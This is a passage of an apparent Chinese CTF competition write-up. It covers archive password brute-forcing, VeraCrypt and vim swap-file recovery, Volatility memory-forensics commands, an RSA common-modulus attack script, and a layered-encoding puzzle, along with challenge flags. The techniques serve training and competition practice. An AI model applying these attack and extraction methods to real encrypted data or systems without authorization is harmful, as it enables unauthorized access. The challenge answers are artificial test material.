class="line">OSAxMCAxMSAxNyAyNCAzMQ==</span><br><span class="line">MSAyIDMgOCAxNSAxNiAxNyAyMiAyOSAzMA==</span><br><span class="line">MiAzIDkgMTYgMTcgMjQgMzAgMzE=</span><br><span class="line">MiA4IDE1IDIzIDI0IDE4IDExIDM=</span><br><span class="line">MSAyIDkgMTcgMjMgMzAgMjk=</span><br><span class="line"></span><br><span class="line">2 3 4 9 15 17 18 23 30</span><br><span class="line">6 13 20 27 28</span><br><span class="line">2 15 22 17 24 16</span><br><span class="line">6 5 4 11 18 25 26 27 28 20 21</span><br><span class="line">2 3 9 15 23 30 31</span><br><span class="line">5 13 20 27 14 21</span><br><span class="line">6 19 26 21 28 20</span><br><span class="line">9 10 11 17 24 31</span><br><span class="line">1 2 3 8 15 16 17 22 29 30</span><br><span class="line">2 3 9 16 17 24 30 31</span><br><span class="line">2 8 15 23 24 18 11 3</span><br><span class="line">1 2 9 17 23 30 29</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>试错试出来flag（fist blood）</p><p>flag{DATESO}</p><h2 id="未知的加密"><a href="#未知的加密" class="headerlink" title="未知的加密"></a>未知的加密</h2><p>掩码暴破密码</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/1.png" alt="img"></p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/2.png" alt="img"></p><p>解压出来一个KDMV文件  改后缀为vmdk</p><p>VM虚拟机映射</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/3.png" alt="img"></p><p>提取enc文件</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/4.png" alt="img">解密enc文件使用veraCrypt挂载，密码同上</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/5.png" alt="img"></p><p>linux中.swp文件恢复即可恢复指令vim -r flag</p><p><a href="https://blog.csdn.net/wanxuexiang/article/details/107116383">Linux下.swp文件的恢复方法-CSDN博客</a></p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/image-20231114134352245.png" alt="image-20231114134352245"></p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/image-20231114134558205.png" alt="image-20231114134558205"></p><p>flag{d89421ac9cf847b0173ee08a74cfd48b}</p><h2 id="Datas-secret"><a href="#Datas-secret" class="headerlink" title="Datas_secret"></a>Datas_secret</h2><p>vol取证</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f image.vmem imageinfo</span><br><span class="line"></span><br><span class="line">vol.py -f image.vmem --profile=Win7SP1x64 filescan | grep <span class="string">"flag"</span></span><br><span class="line"></span><br><span class="line">vol.py -f image.vmem --profile=Win7SP1x64 dumpfiles -Q 0x0000000007a09f20 -D ./</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/image-20231114133924402.png" alt="image-20231114133924402"></p><p>flag{23030d1c2aa90debdf7757782e9f1ee9}</p><h2 id="卑劣的手段"><a href="#卑劣的手段" class="headerlink" title="卑劣的手段"></a>卑劣的手段</h2><p>vol.py -f 1image.vmem –profile=WinXPSP1x64 filescan |grep png</p><p>vol.py -f 1image.vmem –profile=WinXPSP1x64 dumpfiles -Q 0x0000000002d44eb0 -D ./</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps15.jpg" alt="img"> </p><p>提取之后</p><p>Zsteg 1.png</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps16.jpg" alt="img"> </p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>RSA共模攻击</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gongmo</span>(<span class="params">n, c1, c2, e1, e2</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> a, <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x, y = egcd(b, a % b)</span><br><span class="line">            <span class="keyword">return</span> y, x - (a // b) * y</span><br><span class="line">    s = egcd(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">0</span>]</span><br><span class="line">    s2 = s[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 求模反元素</span></span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = invert(c2, n)</span><br><span class="line">    m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line">n= <span class="number">549785700554963543393222974982211136067042846536450239199968863551137077564447156832697813202963334596948298760762991663065504535035143397250208506445202607659676332816610122258862787906629525548439909792727593939957178783466989816894454522630301104349317697612174888605090061231211194974337772507249418567229560145454791075929946332668360553910328900103264562348881791004831033587660163923517440406942993348972589262051083908075790422096042338651001937740085414301019827335549437397656318095919875053213333008551761167437683250592542156348138055482054331330609375930693247365749085041596578748797801601289693449629548744535914348450016287545136436964138806081283470239420969311905998245715160353982174880912315601876305613349276824998688275587308133069178764001924866079232824850209407236694426779262951463035278887804883917516580169051530590466082511045503107508117656821592538792566264160105940730326929474477787053681516844548383814388361089499629312831727731267796167205124844987064389097138747938870221504684958713047985374714612321540288239995935347905120710583169131356970267386562665138437631517802641426575996558648777831102462652517305151412695166331935115971277205305816897886952646432233312318756155702046584205507027737</span></span><br><span class="line">e1= <span class="number">3247473589</span></span><br><span class="line">c1= <span class="number">295658788074157816670393593671184451782123605135184996662528766686642109492132533952160456440919197939935742027629210419312032730004032666912404179229952394343569590488768472800784830058534578639706805456277578757250365834591813481786084959844340418320620440636997732915872346619679993987903742079972676425404864295283955565746004124045155664762158516005326368384488346997494926539295740248007606864906884407198601326915643000764477435205579583836917598642053869541648731754384026407310786288997756775232852732033054591953078116290088267188296560877481534143707414153749140670404213262630122369941889862912426176115220410931992046973925991075473656781794097329513119548617920256625579072719981729556158392454956362838720993254919638177786730004086883044525967823454986241038123671907279715773848673713008902432841449556980494600938989397567019338970200872333713986608537678650318511128703055185979834233315117153115613952940778789222515375743186066883492596068186378372611075958909412662251913621375996518671118244409393829141365207153662416265238312206577474940661548038715230313608405518108581922154335405303862701783678336161505643508831482409054761542959278392940037561736468155509922530420964726953308604138731805543997557197893</span></span><br><span class="line">n2= <span class="number">549785700554963543393222974982211136067042846536450239199968863551137077564447156832697813202963334596948298760762991663065504535035143397250208506445202607659676332816610122258862787906629525548439909792727593939957178783466989816894454522630301104349317697612174888605090061231211194974337772507249418567229560145454791075929946332668360553910328900103264562348881791004831033587660163923517440406942993348972589262051083908075790422096042338651001937740085414301019827335549437397656318095919875053213333008551761167437683250592542156348138055482054331330609375930693247365749085041596578748797801601289693449629548744535914348450016287545136436964138806081283470239420969311905998245715160353982174880912315601876305613349276824998688275587308133069178764001924866079232824850209407236694426779262951463035278887804883917516580169051530590466082511045503107508117656821592538792566264160105940730326929474477787053681516844548383814388361089499629312831727731267796167205124844987064389097138747938870221504684958713047985374714612321540288239995935347905120710583169131356970267386562665138437631517802641426575996558648777831102462652517305151412695166331935115971277205305816897886952646432233312318756155702046584205507027737</span></span><br><span class="line">e2= <span class="number">3698409173</span></span><br><span class="line">c2= <span class="number">219454357017359138238563345020257296433275019950745269658921329153689267055871241202626317639487122341365759606018366576305678949982408366815977617307888894995289951707241009621444691307275542686770303994110416384086739599181934011812163156338859395115724413628620575935425221522079154607411877822646179457455118804970038865452163833416447505142114976758532806787419762250921421272492466133659234602794242531776209324085944417173098820895755851386042954303555790085402616519592065446023510096773546730662074307900123349548340507067971393642039476326402523930789953483843698593104578179169624886357604650615249286150367204109726460230037005175927865466199600272190112483494387929732049738312695796015009178606906549093365261114132002222704510637261038978031857378729856467918978246977163353146981239215886053379980533235786905270211605457443266127512667882149285155542735532327780898540341696557860555884277608448996773250847560675650046440569736010800155992053362696097992699863059686881689842065077997427372972290872427656847223849769329713841670853267584161386494525686204330028142217737052411422895042170169703550774908415280261731967511925122636118468176645781785352430657090024109246103061415446942211482659025722233229083093876</span></span><br><span class="line">result = gongmo(n, c1, c2, e1, e2)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(result)[<span class="number">2</span>:].strip(<span class="string">"L"</span>)))</span><br><span class="line"><span class="comment"># 10786438895797651668751277141337095536046693985225253990501574652797</span></span><br><span class="line"><span class="comment"># b'flag{baby_r3a_sierting_2023}'</span></span><br></pre></td></tr></tbody></table></figure><p>flag{baby_r3a_sierting_2023}</p><h2 id="EasyRSA"><a href="#EasyRSA" class="headerlink" title="EasyRSA"></a>EasyRSA</h2><p>公众问提示：40</p><p>cyberchef解密</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/11.png" alt="img"> </p><h2 id="简单的python"><a href="#简单的python" class="headerlink" title="简单的python"></a>简单的python</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> qsnctf <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">"flag{hahashashahashashashaha}"</span></span><br><span class="line">flag = caesar_encrypt(flag, <span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">21</span>)):</span><br><span class="line">    flag = string_reverse(flag)</span><br><span class="line">flag = atbash_cipher(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">20</span>)):</span><br><span class="line">    flag = base64_encode(flag)</span><br><span class="line">flag = base100_encode(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag=b"👍👤🐧👮👛🐩👈👰👌👏👣👍👎🐾👯👎👍🐧👛🐫👍🐨👐👮👑🐻👉👎👄👍👣🐪👎👢👉👊👍🐧🐨👎👙🐻👅👏👘🐨👁👋👍👡🐸👯👍🐩👁🐼👋👣👟👟👄👌👧👌👍👤👧🐹👜🐽👐👰👊👢👍👌👙🐾👟👦👋👍👍👮👍👍👑👫👚🐼👁👣👉👣👣🐬👌🐩👫👎👍👎👁🐿👘🐾🐰👌👍👣👑🐪👍👣👑👘👚👍🐽👫👉👣👉👅👙🐼👧👁👍👤🐨🐧👘🐨👛🐿👊👢👛👡👉👋👣👘👍👡👅👊👉🐨👧👍👎👤🐽👢👉🐧🐬🐾👌🐩🐨🐫👌🐩👁🐿👛👱🐽👎👍🐼👦👮👍👡🐽👘👎🐽👅👩👘🐾👟👊👜👤👯👎👍👤👧👆👋🐧🐧👯👚🐽👑👏👙👌👑👩👌👡🐸🐨👉🐨👧🐽👎👣👅👌👙🐽👧👍👍👤👫👮👍🐩👁👌👉👏👛👎👘👢👑👏👑🐼👑👆👚🐨👛👪👘🐾👣👊👄👤👟👑👍🐨👛🐫👙🐩👀👰👍👥👅👍👙🐽👑👋👐👣👍👘👚👍👑👫👛🐾🐽👅👉👣👑🐧👑👌👑👆👍👎👁👍👚🐼👛👑👄🐽👑🐪👍👡👁👂👍👍👁👐👑🐽👧👎👉👍👧👰👍👋🐹👘👋🐩👅👪👚🐼👟👡👉👣👁👋👍👣👟🐺👎👣👐👯👎👣👅👊👄👣🐽🐬👌👤👫👢👘👣👁👫👌👣👣👑👙🐽👑👟👐🐩👯👎👚🐨👍👩👑🐽👛👠👉👥🐹👑👎👣👍👘👋🐨👑👏👊👣👑👏👍🐼👧👎👐👢👑👂👊🐽👑👨👊👢👑👣👍👣👑👑👎👢👑👮👙🐾🐼👱👈👢👣👏👎🐿🐹🐿👍🐻👁👊👍🐨👑👬👌👤👟👊👘👱👍👱👎👎👯👦👙🐨👛🐾👎👥👉👅👊🐾👉👪👌👡🐹👪👅🐽👌👰👛🐾👫👏👉🐧👧👀👍👎👯👪👎👤👁🐾👎👤👟👑👄👍👧👟👑🐼👛👊👊🐽👁👩👅👍👅👠👉👤🐰🐪👍🐩👯👎👐👍👈👯👎👣👟👋👙🐽👧👐👍👢👍👮👍🐨👣👩👎👢👫👋👉👣👧👯👌👤🐨🐾👌🐩👁👍👙🐻👑👏👘🐨👧👩👐👌👛🐽👜🐾👅🐿👆👍👛👟👘🐧👧👦👍👢👉👂👋🐩👉🐾👊👥👁👟👉🐩👟👋👐👏👧👎👜👣👛👏👜🐾🐰👠👄👎👉🐿👍🐩🐬👊👋👣👛🐿👌👣👑👌👍👣👧🐿👋👋🐽👊👍👤🐽🐿👆👎👟👠👉👏🐹🐭👎👋🐹👘👚🐨👛👫👊👢👛👏👙👎👟👘👋👎🐬👦👎🐽👢👯👎👢👛👎👍👢👧👱👍🐾👪🐨👍🐧🐨👍👙👱🐽👎👙👏🐹👃👋👢👑👉👜🐽👛👪👘🐽👉👠👉👥🐹👯👍👎👯👢👌🐨👣👎👌👣👑👏👙👌👑👆👋👍👑👮👜🐽👌👰👛🐻🐹👎👄👍👧👰👐🐧👑👮👎🐾🐼👯👚🐿👁👑👍👎👉🐾👑👌👛👆👉🐩👁🐾👘🐾👟👅👍👥🐹👭👍👤👫👊👊🐨👉👫👍👢👛👡👉👎👯👍👐👣👛👦👍🐽👉👏👅👎🐰👎👍👤👉👏👍👎👪🐬👌👢🐨👏👌👥👧👎👄👎👟👭👍🐧👛👂👎👍👍👩👆👍👑👟👘🐨👧👀👍🐾👯👘👐👍👛🐽👅👍👑👇👍🐩👟👧👌👣👟🐹👛🐨👑👪👑🐻👉👡👄👎👉🐧👌🐩👫👢👎🐾👁👏👘🐾🐽👌👍👱👍👭👍🐧👑👩👜🐽👛👩👛🐾👫👊👘🐪🐹🐭👍👣👛🐫👋🐩🐽👎👊👏👧👑👄🐩👟👏👐👋🐽👮👘🐽👑👌👉👣👑👣👉👤👉🐨👌🐩👪🐨👎🐽👁👐👈👥👟👎👍🐪👟👩👋👢👛🐾👉🐨👑👐👑🐾👟👊👍👋👍👌👍👎🐨🐫👛🐩👍🐾👍👏👣👢👉🐪👉👦👐👣👍👮👍🐨👑👫👚🐾🐽👏👙🐽👧👏👐🐧👛👦👎👣👑👏👌👢👛👘👍👎👉👇👌🐧👌🐬👍🐨👧🐿👘🐾👟👅👊🐼👁🐩👍👤🐨🐧👌🐨👄👯👌👏👣👍👘🐩👉👌👐👤👫👮👙🐨👍👨👊👤🐰👎👉👤👯👑👐🐧👑👢👙🐾👁🐿👌👣👣👘👍👎👄🐨👐👍👌👯👎🐽👍👩👘🐽👛👅👘👣👑👌👍👢👛🐫👋🐨👅🐿👉👢👛👉👙🐽👧👧👍👢👍👍👛🐨👑👫👚🐼👛👍👄👍👧🐧👌👤👫👦👌🐽👑👫👘🐽👉👌👍👎👟🐻👋👣👑👘👊🐾👍🐿👉👤👧👅👍🐨👀👮👍👋👁🐧👘🐨👛🐿👊👣👟👟👉🐧👑👍👍👥👧👎👛👣👐👮👎👥👁👣👉👤👉👰👎👢👑👢👍🐩🐼👱👈👡👑👎👘🐩👉🐭👋👍👑👢👉🐨👅👪👎👤👧👊👍🐪👟👐👎👎👯👦👈🐨👉🐾👌👥👁👏👙🐼👧👪👌👤🐨👊👜👣👣👍👎👣👅👟👉👋🐽👱👌🐩🐬👦👍🐨👑🐭👉👋🐹👘👉🐼👑👩👌👡👁👂👊👍👉👫👘🐽👅👟👜👣👑👈👍👢👑👘👐👎👈👰👍👢👛👎👎🐾👯👩👌👢👍👂👎🐽👉👎👎👥👛👣👍👤👫🐪👍🐩🐬👢👎🐽👀👮👍👡👉👑👄🐽👁👇👍🐩🐨🐽👜👍👍👩👑🐾🐽👎👄🐩👟👀👎👋👀👯👊🐨👀👯👚🐼👟👠👉👤👟👋👍👣👟🐺👊🐨👑👫👄👋🐹👍👄👌🐨🐫👍👣👟👦👎🐽👛🐿👘🐽👣👑👙👏👟👟👍👡🐽👪👚🐨👧🐿👆👍👛👊👙👏👟👘👎👋🐹👘👘🐩👁🐿👊👢👟👍👙🐾👯👟👍👣👛👅👄👍👣👎👍👏👟👏👉👣👑👰👐👌👑👢👋👤🐽👪👎👣👍👎👘🐩👈🐧👍🐻🐽👆👊🐽👁👩👑🐽👁👠👉👥🐹👮👍👤👫👎👍👤👈👯👎👥👉👡👉👎👉👎👋👍👑👮👄🐽👍👫👛🐾🐰👍👉👣👧🐧👐👌👑👊👍👍👑👏👘🐼👉👌👙🐽👧👟👌🐧👛👎👊🐽👁👫👚🐼🐬👎👄👌👣🐪👍👣👉👂👄🐾🐼👯👑🐼👟👋👙🐾👟👦👌👡🐹👘👍👣👑👬👚🐽👛👢👙🐽👣🐪👍🐩🐬👂👙🐽👁👫👌👥👣👏👘🐨👧👩👍👡👁🐽👜👣🐽👨👎👣👛👟👄👣👀🐩👍🐽👑👘👎👤👈👮👄👍👛👏👙👎👯👪👐👋🐽👮👎👍👛👏👜🐾🐰👉👄👍👁🐿👍👎🐬👂👎🐾👁🐽👚🐿👅👍👙👋🐽👋👑👎👯👪👍👣👛👪👋👤👟👎👘🐪🐸👯👍👍👛🐫👛🐨👐👰👊👣👣👍👙🐾👟👟👌👢👍👘👐👍👧👍👑🐼👫👋👍👢🐬👱👐👌👛👦👋👢🐨👍👚🐽👛👎👙🐾👅🐫👋👢👛👉👜👍👑👩👑🐽👛👠👙🐼👧👇👍👤👯👢👌🐨👐👯👌👣👟👢👊🐾👉👏👋👍👛🐫👜👍👑👏👄👌👛👏👉👢👣🐪👍👤👧👊👎👢🐨🐿👘🐼👯👎👄👥👟👟👍🐧👑👎👚👣👧🐿👉👣👛👎👄👌👧👉👍👣👉🐺👍👢🐬👎👎👏👟👡👉👎👟👦👌👡👁👦👋🐨👌👮👍👢👫👅👙🐽👧🐧👋👍👉🐺👍👢🐨👍👄👋👉👎👍👤👟👱👍👤🐨🐽👜👍👍👪👍👣👧👠👎🐽👀👱👎👎👧🐾👍🐩👅👎👋👥👉👇👍👤👉👋👐👣👟👦👐👍👛👌👈👤🐽👟👄👢👧👀👌🐩👫👦👍👤👁🐿👜🐾👟👎👙🐾👉👆👋👍👑👪👍🐨👑👐👘🐽👟👊👙🐽👧🐬👎👍👍👘👘🐨👉👫👉👥👅👏👙🐽👑👏👐👋👁👉👄🐽👣👌👉👢🐰👊👄👍👧🐨👍🐾👯👦👘👍👁👪👚🐽👣👏👍🐪👉👭👌👋🐽👆👍🐨👛👩👑🐽👑👟👄👣👁👏👍🐽👑👘👛🐧🐨🐾👍👥👉👢👉👱👣👎👌👤👯👪👅👍👣👍👘🐼👅👎👙👌👧👀👐👌👍👊👍👎👁👐👘🐿👁👎👙🐽👧🐿👑🐼👑👂👛🐾👅🐽👅👍👛👅👍👎👮👱👍👤👯👊👊🐧🐨🐿👉👏👟👘👉👎👟👌👐👢👛👦👙🐨👍👨👈👤🐽👎👙🐽👧🐨👐🐧👑👢👘🐩👁🐾👙🐻👅👎👄👡👍👇👍🐻👁👂👉👤👅👀👚🐽👟👟👄👣👀👱👎👍👑👘👋🐨👁👪👋👥👁👠👉👤👉👆👐👤👯👂👜👍👛👐👚🐼👛👎👙👍👑👏👍🐾🐬👎👍🐾👁🐾👊👥🐹👎👙🐽👧🐪👍🐨👑👘👉🐨👣🐭👉👤👣👅👍🐨👁👀👍🐩👫👘👘🐨👛🐿👊👢👑👡👊🐼🐬👎👐👣👉🐾👍🐽👧👏👜🐿👅👎👙🐾👉👱👍🐾🐨👦👍🐩🐼👱👈👏👟👎👍👤👈🐧👑🐻🐽👑👜👍👅👪👙🐽👑👠👉🐩👟👦👍👎👫👎👐👍👣👎👚🐽👑👘👉👏👉👌👍👤👪🐨👜👣👣👍👑🐾🐰👌👘👱🐽👎👐🐧👑👘👍🐩👁🐿👋👡👉👌👘🐩👉👊👑👍👑👘👚👣👧🐾👑🐾👣👊👄👌👧🐩👍👣👚🐨👛🐩👄👰👊👏👟👍👙🐾👉👐👐👤🐨👊👚🐨👣👩👎👥👅👆👍👤👫🐪👍👤🐨🐧👍🐧🐨🐼👉👢👑👍👙👏🐹🐿👍🐩👯👘👎🐽👍👬👎👣👛👅👙👤👟👦👍👡🐹👘👍🐩👅👪👚🐼👟👊👙🐾👉👏👋👍👍👮👌👣👑👪👑🐿👛👋👄👌👣🐫👌🐨👟👪👌🐩🐼👰👘🐿🐹👍👙👏👄👯👐🐧👑👪👍👍🐽👬👑🐼🐬👠👉👥🐸👮👍🐽👑👊👈🐨👑👩👄👍👑👅👍🐽👁👏👍👤🐨👦👜👣👑👫👄👌👑👣👍👣👑👱👍🐩👯👮👘👍👛🐾👊👏👧👏👍👣👑👟👍👡👁👊👊🐽👑👩👎👤👫👊👄🐧👁👌👎👎👫👦👈🐧🐬🐾👎👣👍👋👎🐾👉👇👍👡🐹👮👊👍👌👰👛🐾🐰👎👙👌👧👀👑👌👛👦👍🐩👁🐿👌👢🐰👌👍👣👧👱👍👡🐽👘👎👎🐽🐾👘🐽👅👠👉👥🐸🐩👍🐨👑👎👐👎🐼👯👌👥👅👏👎🐾👯👦👌👢👍👮👎🐽👉👎👎👥👛👟👉👣👐🐩👌👤👫👮👙🐽👁👪👊👡🐽👎👙👏👟👃👐👍👑👂👚🐩👅🐾👙🐽👛👊👙🐼👧👀👍👏👧🐹👄👎👄👯👑🐿👁👘👉👣👧👦👋👎👯👂👎🐽👑🐾👎👤🐽👢👄🐻🐽🐿👍👤🐬👊👘🐨👁🐭👙🐽👛👍👙👏👟👱👋👣👑👪👍👤🐽🐽👋👣👛👠👍👏🐹👁👎👍👍👎👋🐨👣👎👊👢👑👏👙👎👟👘👑👎👫👘👄🐨👍👪👎👣👛👢👉🐧🐬🐾👋👣👑👢👋👣👑👏👛🐪👧👎👙👏👟👋👌👱🐸👯👊🐽👁👐👘🐾🐽👊👍🐩👟👍👎👎👫👢👙🐩👀👯👍👥🐽👉👙👌👑👏👐👢👑👮👄🐽👧👍👘🐾👫👌👘👱🐽👑👌👎👯👪👐👍👑👏👘🐼👯👑👘🐨👧👘👑👌👑👢👚👤👁🐿👉👣👅👎👄👌👐👱👍👤👯👊👊🐨👁👫👍👥👅👊👙🐾👯👟👌👤🐨👦👚🐽👍👫👜🐿👛👠👄👎👉👏👍👎👫🐧👌🐧🐨👎👙🐻👉👏👘🐩👟👏👍👢👛👂👎🐾👍👀👋👣👧👎👉👍👦👱👍👡🐽👘👘🐨👛🐿👍👢👟👇👍👢👧👆👍👣👉🐽👄🐽👑👪👑🐻👉👟👄👎👯👏👌🐩👯👢👘👣👅🐽👅👍👛👑👙🐽👁🐿👍👢👑👑👜👎👍🐿👛🐾👧👠👉👥🐹👎👍👎🐨🐫👘🐨👉👪👎👥👍👉👘👣👧👐👍👢👍👂👘🐽👑👨👉👤👫👊👄👎👉🐨👍🐾👯👊👘🐼🐨👫👘🐾🐰👎👍🐪👉👏👎👍👑👪👍🐩👅🐾👎👤🐽👊👎🐽👁👍👍👤🐨👱👄👎👍👪👙🐽👑👘👉👱👣👍👐👏👧🐾👍🐨👢👮👎👤🐽👎👄👢👧👀👍🐾👧👊👍👎🐼👰👌👣👅👘👍👣👧👟👐🐩👯👮👉🐨👧🐾👘🐽👅👅👄👤👞🐨👍👤👯👢👛🐨🐼👯👙🐽👟👌👘🐩👉👏👐👤👯👂👚🐨👌👮👑🐽👅👡👄👎👯👰👍🐩👯👢👋🐨👑👬👈👣👛👑👍👎👈👮👍🐧👑👁👛🐩👅🐽👘🐽👧👅👉👥🐹🐩👍👡👁👱👜🐽👅🐿👉👢👑👣👉👤👉👦👐👋🐽👮👙🐨👑👏👄👋👉👟👄👢🐬🐧👍👤👫👢👐👍👁👌👍👣👟👑👙👏👉👃👌🐩👯👑👜🐽👍👩👚🐾👯👊👘👱🐼🐧👍👋🐽👦👙🐩🐽👪👊👣👟👟👊🐼👁👎👐👣👉🐾👛👣👑👩👎👤🐽👡👄👢👑🐾👍🐾👯👊👋👣👑👬👈👏👛👎👉👣👧👋👌👋🐽👘👚👢🐨👎👎👢🐬👎👉👢👧👐👎👎👫👢👙🐩👉👪👎👏👛👏👙👏👉👌👌👡🐹👘👊👍👣👍👎👤🐽👌👙🐼👧🐨👌👎🐧🐬👍🐩👁👌👉👋🐹👑👜👢👧👇👐👱🐽👮👊👍👅👫👛🐽👅👅👄🐼👧👍👍🐨👛🐧👙🐨🐼👮👅👌👛👏👙🐽👑👌👍🐧👛👊👌🐽👑👨👈👥👛👋👍👣👍🐬👑🐼👚🐬👍🐩👁👍👚🐼👣👘👍👎👉👭👍👡👁👂👊🐽👍👩👆👍👍👎👙🐿🐹🐭👍👤👧🐾👐👍👛👏👉👢👛👟👉👢🐬👧👌👤🐬🐹👄👣👐👯👎👣👛👑👍🐧👍🐫👍👎🐬👆👎🐽👛🐿👜🐾🐰👍👘🐨👑🐪👍🐧👑👊👍🐨👛👬👑🐾👟👊👙🐽👢👰👍👎🐨🐧👛🐩👁🐾👊👥👅👋👘👢👑👏👌👥👧🐾👊🐽👑👌👊👢👫👊👄👢🐬🐿👐👢👑👦👍🐧🐧👯👊👡👁👎👍👣👁🐺👋👍👛👅👜🐽👧👀👊👤👟👊👄🐨👁👌👍🐽👍👘👛🐨👛👎👑🐽👟👣👉🐧👑👘👍👤🐨👊👎🐽👐👰👜🐾🐰👟👄👌👦🐩👐👢👚🐬👍👍👑👪👎👥👧👌👙🐽👧👱👍👤🐨🐾👉👣👉👪👑🐾👣👎👎🐼👁👂👍🐨👑👎👍🐨👈👯👙🐽👛👋👘🐨👧👐👐👣👛👦👐👍👧👏👛🐾🐽👅👄👍👑👱👍🐩👯👢👘🐨👀👮👅👌👛👌👙🐽👧👩👍🐾👯👘👎🐾👈👱👚🐽👛👠👎🐾👟👌👍👏👧🐹👜🐽👅🐾👋👣👣👠👉👢🐬👦👋👎👯👂👍👣👛👏👄👏👧👅👍👣👧👏👐👢👟👂👐👍👁🐭👙🐽👟👑👘🐨👧🐪👑👎👯👑👜👌🐬👏👛🐽👍👟👜👢👑👐👎👋🐹👦👚🐨👐👮👄👏🐽👊👘🐩👟👘👍👡👅👦👘